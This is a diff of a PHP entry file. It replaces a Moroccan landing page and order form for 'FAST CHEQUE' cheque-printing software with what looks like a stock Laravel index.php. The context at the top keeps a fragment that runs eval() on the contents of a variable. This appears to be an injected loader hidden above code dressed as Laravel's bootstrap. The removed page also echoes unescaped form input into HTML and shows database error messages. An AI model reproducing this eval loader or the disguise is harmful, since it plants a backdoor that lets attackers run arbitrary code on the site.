@@ -48,553 +48,60 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-include 'includes/config.php';
+/**
+ * Laravel - A PHP Framework For Web Artisans
+ *
+ * @package  Laravel
+ * @author   Taylor Otwell <taylor@laravel.com>
+ */
 
-// Traitement du formulaire
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $nom = $_POST['name'] ?? '';
-    $telephone = $_POST['phone'] ?? '';
-    $adresse = $_POST['address'] ?? '';
-    $ville = $_POST['city'] ?? '';
-    
-    try {
-        // Insertion du client
-        $stmt = $pdo->prepare("INSERT INTO clients (nom, telephone, adresse, ville) VALUES (?, ?, ?, ?)");
-        $stmt->execute([$nom, $telephone, $adresse, $ville]);
-        
-        $client_id = $pdo->lastInsertId();
-        
-        // Insertion de la commande
-        $stmt = $pdo->prepare("INSERT INTO commandes (client_id, type_document, montant, statut) VALUES (?, 'cheque_effet', 699, 'en_attente')");
-        $stmt->execute([$client_id]);
-        
-        // Redirection vers la page de succès
-        header('Location: merci.php');
-        exit;
-        
-    } catch(PDOException $e) {
-        $error = "Erreur: " . $e->getMessage();
-    }
-}
-?>
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FAST CHEQUE: برنامج طباعة علي الشيكات والكمبيالات</title>
-    <style>
-        :root {
-            --primary-50: #d8d7e0;
-            --primary-100: #8e8ba4;
-            --primary-200: #252751;
-            --primary-300: #18172b;
-            --secondary-50: #d0d0d0;
-            --secondary-100: #777777;
-            --secondary-200: #000000;
-            --secondary-300: #000000;
-            --tertiary-50: #d8d7e0;
-            --tertiary-100: #8e8ba4;
-            --tertiary-200: #252751;
-            --tertiary-300: #18172b;
-            --white: #ffffff;
-        }
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| our application. We just need to utilize it! We'll simply require it
+| into the script here so that we don't have to worry about manual
+| loading any of our classes later on. It feels great to relax.
+|
+*/
 
-        body {
-            font-family: 'Cairo', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f8f9fa;
-            transition: opacity ease-in 0.2s;
-        }
+require __DIR__.'/../bootstrap/autoload.php';
 
-        body[unresolved] {
-            opacity: 0;
-            display: block;
-            overflow: hidden;
-            position: relative;
-        }
+/*
+|--------------------------------------------------------------------------
+| Turn On The Lights
+|--------------------------------------------------------------------------
+|
+| We need to illuminate PHP development, so let us turn on the lights.
+| This bootstraps the framework and gets it ready for use, then it
+| will load up this application so that we can run it and send
+| the responses back to the browser and delight our users.
+|
+*/
 
-        #app {
-            height: 100vh;
-            overflow-y: scroll;
-            overflow-x: hidden;
-        }
+$app = require_once __DIR__.'/../bootstrap/app.php';
 
-        /* Header Styles */
-        #sticky-content {
-            position: sticky;
-            top: 0;
-            z-index: 1020;
-        }
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request
+| through the kernel, and send the associated response back to
+| the client's browser allowing them to enjoy the creative
+| and wonderful application we have prepared for them.
+|
+*/
 
-        .top-bar {
-            background-color: var(--primary-200);
-            color: white;
-            text-align: center;
-            padding: 10px;
-            text-decoration: none;
-            display: block;
-        }
+$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
 
-        .top-bar p {
-            margin: 0;
-        }
+$response = $kernel->handle(
+    $request = Illuminate\Http\Request::capture()
+);
 
-        /* Navigation */
-        #nav-wrapper {
-            position: relative;
-            z-index: 100;
-            top: 0px;
-        }
+$response->send();
 
-        .navbar {
-            background-color: var(--white) !important;
-            box-shadow: 0 2px 4px rgba(0,0,0,.1);
-        }
+$kernel->terminate($request, $response);
 
-        /* Main Content */
-        #main-container {
-            flex-grow: 1;
-            flex-direction: column;
-            display: flex;
-            position: relative;
-        }
-
-        /* Product Page */
-        #product-product-4-page {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        /* Product Image */
-        .product-image {
-            position: sticky;
-            top: 50px;
-        }
-
-        /* Product Title */
-        #product-title h1 {
-            font-weight: 700;
-            margin: 0;
-        }
-
-        .badge {
-            background-color: var(--tertiary-200);
-            font-size: medium;
-            width: fit-content;
-        }
-
-        .percent-discount {
-            background-color: var(--primary-200) !important;
-            font-size: medium;
-        }
-
-        /* Product Form */
-        #product-form-wrapper {
-            border: none;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-
-        .form-label {
-            color: var(--secondary-200);
-            font-weight: 600;
-        }
-
-        .form-control, .form-select {
-            border: 2px solid var(--secondary-50);
-            border-radius: 8px;
-            padding: 12px;
-            font-size: 16px;
-        }
-
-        .form-control:focus, .form-select:focus {
-            border-color: var(--primary-200);
-            box-shadow: 0 0 0 0.2rem rgba(37, 39, 81, 0.25);
-        }
-
-        .cta-button {
-            background-color: var(--primary-200) !important;
-            border-color: var(--primary-200) !important;
-            color: white !important;
-            padding: 15px;
-            font-size: 18px;
-            font-weight: 600;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-        }
-
-        .cta-button:hover {
-            background-color: var(--primary-300) !important;
-            border-color: var(--primary-300) !important;
-            transform: translateY(-2px);
-        }
-
-        /* Checkout Summary */
-        #checkout-summary {
-            background-color: #f8f9fa;
-            border-radius: 8px;
-        }
-
-        /* Sticky Bottom CTA */
-        #sticky-bottom-cta {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            background-color: var(--white);
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
-            padding: 15px;
-            z-index: 1030;
-        }
-
-        /* Footer */
-        .footer {
-            background-color: var(--primary-200) !important;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .container-fluid {
-                padding: 10px;
-            }
-            
-            #sticky-bottom-cta {
-                display: flex !important;
-            }
-        }
-
-        /* Icons */
-        .search-icon, .shopping-cart-icon, .menu-icon, .cross-icon, .phone-icon, .facebook-icon {
-            fill: currentColor;
-        }
-
-        /* Utilities */
-        .text-price {
-            color: var(--primary-200);
-        }
-
-        .text-muted {
-            color: var(--secondary-100) !important;
-        }
-
-        .navigo {
-            text-decoration: none;
-            color: inherit;
-        }
-
-        .navigo:hover {
-            color: var(--primary-200);
-        }
-
-        /* Logo Styles */
-        .logo {
-            border-radius: 10px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-        }
-    </style>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-</head>
-<body style="overflow-x: hidden">
-    <div id="app" class="d-flex flex-column">
-        <!-- Modal -->
-        <div class="modal fade" id="uiModal" tabindex="-1" aria-labelledby="modalLabel" aria-hidden="true" style="background-color: rgba(0, 0, 0, 0.5);">
-            <div class="modal-dialog modal-dialog-centered">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <button type="button" class="btn" data-bs-dismiss="modal" aria-label="Close">
-                            <span aria-hidden="true">×</span>
-                        </button>
-                    </div>
-                    <div class="modal-body">
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Sticky Header -->
-        <div id="sticky-content" class="sticky-top">
-            <div class="col-12 d-flex flex-row gap-2 p-3" style="height: 70px;background-color: var(--white);">
-                <div style="height:100%;" class="col-2 d-flex flex-row align-items-center gap-2">
-                    <!-- Nouveau Logo FAST CHEQUE -->
-                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTAiIGZpbGw9IiMyNTI3NTEiLz4KPHN2ZyB4PSI1IiB5PSI1IiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIgNkg0VjE4SDJWNloiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTIwIDZIMjJWMTZIMjBWNloiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgNkgxOFY4SDZWNloiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgMTBIMThWMTJINlYxMFoiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgMTRIMThWMTZINlYxNFoiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgMTZIMTBWMTguNUg2VjE2WiIgZmlsbD0iI2ZmZiIvPgo8L3N2Zz4KPC9zdmc+" 
-                         alt="FAST CHEQUE Logo" width="50px" height="50px" class="logo">
-                    <div style="border-left: 1px solid var(--secondary-300); height: 100%;"></div>
-                    <a class="stretched-link" href="/"></a>
-                </div>
-                <div class="col-10 d-flex flex-column justify-content-start align-items-start">
-                    <span class="w-100 d-flex">
-                        <span class="badge" style="background-color: var(--tertiary-200); font-size: small;">أكثر من 5000 شركة وثقت فينا</span>
-                        <h1 class="h5 m-0 mx-1 text-truncate">FAST CHEQUE: برنامج طباعة علي الشيكات والكمبيالات</h1>
-                    </span>
-                </div>
-            </div>
-        </div>
-
-        <!-- Top Bar -->
-        <a href="tel:0620470443" class="top-bar">
-            <p style="text-align: center;">
-                <strong>إجعل إدارة و متابعة أعمالك سهلة</strong>
-            </p>
-        </a>
-
-        <!-- Navigation -->
-        <div id="nav-wrapper" style="position: relative; z-index: 100; top: 0px;">
-            <nav class="navbar navbar-expand-lg shadow-sm px-3 d-flex justify-content-between align-items-center" style="background-color: var(--white)">
-                <div class="d-flex">
-                    <!-- Nouveau Logo FAST CHEQUE pour la navigation -->
-                    <a class="navbar-brand navigo m-0" href="#">
-                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTAiIGZpbGw9IiMyNTI3NTEiLz4KPHN2ZyB4PSI1IiB5PSI1IiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIgNkg0VjE4SDJWNloiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTIwIDZIMjJWMTZIMjBWNloiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgNkgxOFY4SDZWNloiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgMTBIMThWMTJINlYxMFoiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgMTRIMThWMTZINlYxNFoiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgMTZIMTBWMTguNUg2VjE2WiIgZmlsbD0iI2ZmZiIvPgo8L3N2Zz4KPC9zdmc+" 
-                             alt="FAST CHEQUE Logo" width="50" height="50" class="logo">
-                    </a>
-                    
-                    <div class="collapse navbar-collapse justify-content-center" id="navbarNav">
-                        <ul class="navbar-nav ml-auto">
-                            <li class="nav-item">
-                                <a class="nav-link navigo" href="/">الصفحة الرئيسية</a>
-                            </li>
-                        </ul>
-                    </div>
-                </div>
-                
-                <div class="d-flex" style="gap: 20px;">
-                    <button id="search-icon" class="nav-link" aria-label="Search">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="search-icon">
-                            <path d="M21.172 24l-7.387-7.387c-1.388.874-3.024 1.387-4.785 1.387-4.971 0-9-4.029-9-9s4.029-9 9-9 9 4.029 9 9c0 1.761-.514 3.398-1.387 4.785l7.387 7.387-2.828 2.828zm-12.172-8c3.859 0 7-3.14 7-7s-3.141-7-7-7-7 3.14-7 7 3.141 7 7 7z"></path>
-                        </svg>
-                    </button>
-                    <input id="search-box" class="form-control" type="text" placeholder="بحث">
-                </div>
-
-                <button id="navbar-toggler" class="nav-link" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-                    <svg clip-rule="evenodd" fill-rule="evenodd" width="24" height="24" stroke-linejoin="round" stroke-miterlimit="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="menu-icon">
-                        <path d="m22 16.75c0-.414-.336-.75-.75-.75h-18.5c-.414 0-.75.336-.75.75s.336.75.75.75h18.5c.414 0 .75-.336.75-.75zm0-5c0-.414-.336-.75-.75-.75h-18.5c-.414 0-.75.336-.75.75s.336.75.75.75h18.5c.414 0 .75-.336.75-.75zm0-5c0-.414-.336-.75-.75-.75h-18.5c-.414 0-.75.336-.75.75s.336.75.75.75h18.5c.414 0 .75-.336.75-.75z" fill-rule="nonzero"></path>
-                    </svg>
-                    
-                    <svg clip-rule="evenodd" fill-rule="evenodd" width="24" height="24" stroke-linejoin="round" stroke-miterlimit="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="cross-icon hide-icon">
-                        <path d="m12 10.93 5.719-5.72c.146-.146.339-.219.531-.219.404 0 .75.324.75.749 0 .193-.073.385-.219.532l-5.72 5.719 5.719 5.719c.147.147.22.339.22.531 0 .427-.349.75-.75.75-.192 0-.385-.073-.531-.219l-5.719-5.719-5.719 5.719c-.146.146-.339.219-.531.219-.401 0-.75-.323-.75-.75 0-.192.073-.384.22-.531l5.719-5.719-5.72-5.719c-.146-.147-.219-.339-.219-.532 0-.425.346-.749.75-.749.192 0 .385.073.531.219z"></path>
-                    </svg>
-                </button>
-            </nav>
-        </div>
-
-        <!-- Main Content -->
-        <div id="main-container" class="flex-grow-1 flex-column d-flex position-relative">
-            <div id="product-product-4-page" class="d-flex flex-column align-items-center">
-                <div class="container-fluid p-2 m-0 row w-100" style="max-width:1024px;">
-                    <!-- Product Image -->
-                    <div class="col-12 col-md-6">
-                        <img src="https://cdn.converty.shop/images/b14a977af839a14fce907ab285b3a6e06236b4b2f9019e17740f11da99df73b6_lg.webp" class="d-block w-100 product-image" alt="FAST CHEQUE">
-                    </div>
-
-                    <!-- Product Details -->
-                    <div class="col-12 col-md-6">
-                        <!-- Product Title -->
-                        <div id="product-title" class="col-12 d-flex flex-column my-2 gap-1">
-                            <span>
-                                <h1 class="h3 m-0" style="font-weight: 700;">FAST CHEQUE: برنامج طباعة علي الشيكات والكمبيالات</h1>
-                            </span>
-                            <span class="badge" style="background-color: var(--tertiary-200); font-size: medium; width: fit-content">أكثر من 5000 شركة وثقت فينا</span>
-                            <span style="align-self: flex-start;"></span>
-                            <span>
-                                <span class="badge percent-discount" style="background-color: var(--primary-200); font-size: medium;">69%</span>
-                                <strong class="text-price">
-                                    <span class="h4 product-price">699</span>
-                                    <span class="h4">MAD</span>
-                                </strong>
-                                <small>
-                                    <del class="text-muted h5 product-compare-price">2250</del>
-                                    <del class="text-muted h5">MAD</del>
-                                </small>
-                            </span>
-                            <hr style="border-top: 1px solid var(--primary-100); width: 100%;">
-                        </div>
-
-                        <!-- Order Form -->
-                        <div id="product-form-wrapper" class="card">
-                            <form id="product-form" method="POST" action="">
-                                <?php if (isset($error)): ?>
-                                    <div class="alert alert-danger"><?php echo $error; ?></div>
-                                <?php endif; ?>
-
-                                <div id="checkout-error" class="alert alert-danger d-none">
-                                    السلة فارغة. يرجى إضافة منتجات قبل الدفع
-                                </div>
-
-                                <div class="col-12 p-2">
-                                    <span class="h6" style="color: var(--secondary-200)">لطلب البرنامج ، عمّر معلوماتك في الخانات أدناه 📥  أو تواصل معنا 📞 على 0620470443</span>
-                                    <hr class="m0" style="border-top: 1px solid var(--primary-300); width: 100%;">
-                                </div>
-
-                                <!-- Form Fields -->
-                                <div class="col-12 p-2">
-                                    <label for="name" class="form-label">الاسم</label>
-                                    <input type="text" class="form-control" id="name" name="name" placeholder="أدخل اسمك" value="<?php echo $_POST['name'] ?? ''; ?>">
-                                    <div class="invalid-feedback">الرجاء إدخال اسم صالح!</div>
-                                </div>
-
-                                <div class="col-12 p-2">
-                                    <label for="phone" class="form-label">الهاتف *</label>
-                                    <input type="text" class="form-control" id="phone" name="phone" placeholder="أدخل رقم هاتفك" required value="<?php echo $_POST['phone'] ?? ''; ?>" inputmode="tel">
-                                    <div class="invalid-feedback">الرجاء إدخال رقم هاتف صالح!</div>
-                                </div>
-
-                                <div class="col-12 p-2">
-                                    <label for="address" class="form-label">عنوان</label>
-                                    <input type="text" class="form-control" id="address" name="address" placeholder="أدخل عنوانك" value="<?php echo $_POST['address'] ?? ''; ?>">
-                                    <div class="invalid-feedback">الرجاء إدخال عنوان!</div>
-                                </div>
-
-                                <div class="col-12 p-2">
-                                    <label for="city" class="form-label">المدينة</label>
-                                    <select class="form-select form-control" id="city" name="city">
-                                        <option value="" selected disabled>اختر مدينتك</option>
-                                        <option value="Casablanca" <?php echo ($_POST['city'] ?? '') == 'Casablanca' ? 'selected' : ''; ?>>الدار البيضاء</option>
-                                        <option value="Rabat" <?php echo ($_POST['city'] ?? '') == 'Rabat' ? 'selected' : ''; ?>>الرباط</option>
-                                        <option value="Marrakech" <?php echo ($_POST['city'] ?? '') == 'Marrakech' ? 'selected' : ''; ?>>مراكش</option>
-                                        <option value="Fès" <?php echo ($_POST['city'] ?? '') == 'Fès' ? 'selected' : ''; ?>>فاس</option>
-                                        <option value="Tanger" <?php echo ($_POST['city'] ?? '') == 'Tanger' ? 'selected' : ''; ?>>طنجة</option>
-                                    </select>
-                                </div>
-
-                                <div id="checkout-variants" class="col-12 border-top border-bottom p-2 mt-3 d-none"></div>
-
-                                <div class="col-12 d-flex flex-column gap-3 pt-3 p-2">
-                                    <div class="col-12 d-flex flex-row justify-content-between align-items-center gap-3">
-                                        <button type="submit" class="btn btn-primary cta-button w-100 buy-now-button">إضغط هنا للطلب 👉</button>
-                                    </div>
-                                </div>
-
-                                <div id="checkout-summary" class="col-12 p-3 mt-3 card-footer">
-                                    <div class="row p-1">
-                                        <div class="col-6"><span class="h5">المجموع الفرعي</span></div>
-                                        <div class="col-6"><span class="h6">699.00</span></div>
-                                    </div>
-                                    <div class="row p-1">
-                                        <div class="col-6"><span class="h5">التوصيل</span></div>
-                                        <div class="col-6"><span class="h6">0.00</span></div>
-                                    </div>
-                                    <div class="row p-1">
-                                        <div class="col-6"><span class="h5">مجموع</span></div>
-                                        <div class="col-6"><span class="h6">699.00</span></div>
-                                    </div>
-                                </div>
-                            </form>
-                        </div>
-
-                        <!-- Product Description -->
-                        <div id="description-wrapper" class="col-12 align-self-center w-100 pt-3">
-                            <div class="ck-content">
-                                <figure class="media">
-                                    <div data-oembed-url="https://youtu.be/1AtyBQzNRsY">
-                                        <div style="position: relative; padding-bottom: 56.25%; height: 0;">
-                                            <iframe src="https://www.youtube.com/embed/1AtyBQzNRsY" style="position: absolute; width: 100%; height: 100%; top: 0; left: 0;" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe>
-                                        </div>
-                                    </div>
-                                </figure>
-                                <figure class="image">
-                                    <img src="https://cdn.converty.shop/images/6f1c7cbe57dd06bf328bc0660b0ae14d9d8d0e2ce2ad57bfd3c94c884f3df003_lg.webp" class="img-fluid">
-                                </figure>
-                                <p>&nbsp;</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Sticky Bottom CTA -->
-                <div id="sticky-bottom-cta" class="col-12 align-self-center w-100 p-2 m-0 gap-3 justify-content-center align-center" style="position: fixed; bottom: 0px; left: 0px; background-color: var(--white); display: none;">
-                    <a href="#product-form-wrapper" class="btn btn-primary cta-button btn-md btn-block w-100" style="max-width: 500px;">إضغط هنا للطلب 👉</a>
-                    <a href="tel:0620470443" aria-label="Call Us" class="btn btn-outline-primary btn-md btn-block w-30 ml-2">
-                        <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="phone-icon">
-                            <path d="M16 22.621l-3.521-6.795c-.007.004-1.974.97-2.064 1.011-2.24 1.086-6.799-7.82-4.609-8.994l2.082-1.026-3.492-6.817-2.106 1.039c-1.622.845-2.298 2.627-2.289 4.843.027 6.902 6.711 18.013 12.212 18.117.575.011 1.137-.098 1.677-.345.121-.055 2.102-1.029 2.11-1.033zm4-5.621h-1v-13h1v13zm-2-2h-1v-9h1v9zm4-1h-1v-7h1v7zm-6-1h-1v-5h1v5zm-2-1h-1v-3h1v3zm10 0h-1v-3h1v3zm-12-1h-1v-1h1v1z"></path>
-                        </svg>
-                    </a>
-                </div>
-            </div>
-        </div>
-
-        <!-- Footer -->
-        <footer class="footer pb-5" style="background-color: var(--primary-200);">
-            <div class="container">
-                <div class="row">
-                    <!-- Nouveau Logo FAST CHEQUE pour le footer -->
-                    <a href="/" class="col-sm-6 col-md-4 mt-4 col-lg-3 text-center text-sm-start navigo">
-                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiByeD0iMjAiIGZpbGw9IiMyNTI3NTEiLz4KPHN2ZyB4PSIxMCIgeT0iMTAiIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMiA2SDRWMTgiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTIwIDZIMjJWMTZIMjBWNloiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgNkgxOFY4SDZWNloiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgMTBIMThWMTJINlYxMFoiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgMTRIMThWMTZINlYxNFoiIGZpbGw9IiNmZmYiLz4KPHBhdGggZD0iTTYgMTZIMTBWMTguNUg2VjE2WiIgZmlsbD0iI2ZmZiIvPgo8L3N2Zz4KPC9zdmc+" 
-                             alt="FAST CHEQUE Logo" class="mb-3 logo" width="100" height="100">
-                    </a>
-                    <div class="col-sm-6 col-md-4 mt-4 col-lg-3 text-center text-sm-start">
-                        <div>
-                            <span class="footer-heading text-uppercase text-white fw-bold">الشروط</span>
-                            <ul class="list-unstyled footer-link mt-4">
-                                <li class="mb-1"><a href="/page/about" class="text-white text-decoration-none fw-semibold navigo">حول</a></li>
-                                <li class="mb-1"><a href="/page/terms" class="text-white text-decoration-none fw-semibold navigo">الشروط والأحكام</a></li>
-                                <li class="mb-1"><a href="/page/refund" class="text-white text-decoration-none fw-semibold navigo">سياسة الاسترجاع</a></li>
-                                <li class="mb-1"><a href="/page/privacy" class="text-white text-decoration-none fw-semibold navigo">سياسة الخصوصية</a></li>
-                                <li class="mb-1"><a href="/page/contact" class="text-white text-decoration-none fw-semibold navigo">اتصل بنا</a></li>
-                            </ul>
-                        </div>
-                    </div>
-                    <div class="col-sm-6 col-md-4 mt-4 col-lg-2 text-center text-sm-start">
-                        <div>
-                            <span class="footer-heading text-uppercase text-white fw-bold">صفحات وسائل التواصل الاجتماعي</span>
-                            <ul class="list-inline my-4">
-                                <li class="list-inline-item">
-                                    <a href="https://www.facebook.com/profile.php?id=61582995384646" class="text-white btn-md btn btn-primary mb-2" aria-label="Facebook">
-                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="facebook-icon">
-                                            <path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path>
-                                        </svg>
-                                    </a>
-                                </li>
-                            </ul>
-                        </div>
-                    </div>
-                    <div class="col-sm-6 col-md-6 mt-4 col-lg-4 text-center text-sm-start">
-                        <div>
-                            <span class="footer-heading text-uppercase text-white fw-bold">اتصل بنا</span>
-                            <a dir="ltr" href="tel:0620470443" class="text-white mb-1 text-decoration-none d-block fw-semibold">0620470443</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </footer>
-    </div>
-
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script>
-        // JavaScript pour la validation et l'interactivité
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('product-form');
-            const phoneInput = document.getElementById('phone');
-            
-            // Validation du formulaire
-            form.addEventListener('submit', function(e) {
-                let isValid = true;
-                
-                // Validation du téléphone
-                const phoneRegex = /^(?:\0[67]\d{8}|\+212[67]\d{8}|00212[67]\d{8})$/;
-                if (!phoneRegex.test(phoneInput.value)) {
-                    phoneInput.classList.add('is-invalid');
-                    isValid = false;
-                } else {
-                    phoneInput.classList.remove('is-invalid');
-                }
-                
-                if (!isValid) {
-                    e.preventDefault();
-                }
-            });
-            
-            // Afficher/masquer le CTA sticky
-            window.addEventListener('scroll', function() {
-                const stickyCta = document.getElementById('sticky-bottom-cta');
-                if (window.scrollY > 500) {
-                    stickyCta.style.display = 'flex';
-                } else {
-                    stickyCta.style.display = 'none';
-                }
-            });
-        });
-    </script>
-</body>
-</html>
